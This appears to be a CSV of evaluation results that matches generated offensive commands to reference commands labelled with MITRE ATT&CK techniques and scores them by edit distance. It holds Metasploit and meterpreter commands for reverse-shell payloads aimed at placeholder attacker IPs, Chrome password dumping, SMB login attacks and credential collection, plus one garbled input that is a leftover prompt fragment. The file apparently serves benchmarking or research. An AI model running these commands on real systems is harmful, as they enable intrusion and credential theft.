file,tool,input_command,matched_command,edit_score,match_found
command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.438,True
command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.404,True
command_metasploit_TA0002_T1035.txt,metasploit,msfpayload windows/xp/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> > payload.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,0.654,True
command_metasploit_TA0002_T1059.txt,metasploit,use auxiliary/scanner/smb/smb_login,"```sh
msf> use auxiliary/admin/smb/psexec_ntdsgrab
```",0.517,True
command_metasploit_TA0002_T1059.txt,metasploit,set RHOST <IP_address>,`meterpreter > load powershell`,0.302,True
command_metasploit_TA0002_T1059.txt,metasploit,set SMBUSER <username>,`msf> loot -t screenspy.screenshot`,0.281,True
command_metasploit_TA0002_T1059.txt,metasploit,set SMBPASS <password>,`msf> loot -t screenspy.screenshot`,0.281,True
command_metasploit_TA0002_T1059.txt,metasploit,exploit,`meterpreter > load powershell`,0.211,True
command_metasploit_TA0002_T1059.txt,metasploit,use post/windows/manage/powershell Empire,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,0.393,True
command_metasploit_TA0002_T1059.txt,metasploit,"set LOAD_MODULES powershell,Empire",`meterpreter > load powershell`,0.431,True
command_metasploit_TA0002_T1059.txt,metasploit,run,`sudo msfconsole`,0.2,True
command_metasploit_TA0002_T1059.txt,metasploit,use post/windows/manage/powershell Empire/tunnel_powershell,`meterpreter > powershell_import /home/<attacker>/carbanak/Resources/step6/powerview.ps1`,0.351,True
command_metasploit_TA0002_T1059.txt,metasploit,set LHOST <IP_address>,`meterpreter > load powershell`,0.302,True
command_metasploit_TA0002_T1059.txt,metasploit,set LPORT <port_number>,`meterpreter> getsystem -t 1`,0.308,True
command_metasploit_TA0002_T1059.txt,metasploit,run,`sudo msfconsole`,0.2,True
command_metasploit_TA0002_T1059.txt,metasploit,""" and enclosed in backticks (`) as required.","[meterpreter\*] > `upload SysinternalsSuite.zip ""C:\\Users\\username\\Downloads\\SysinternalsSuite.zip""`",0.23,True
command_metasploit_TA0007_T1018.txt,metasploit,recon info,`sudo msfconsole`,0.296,True
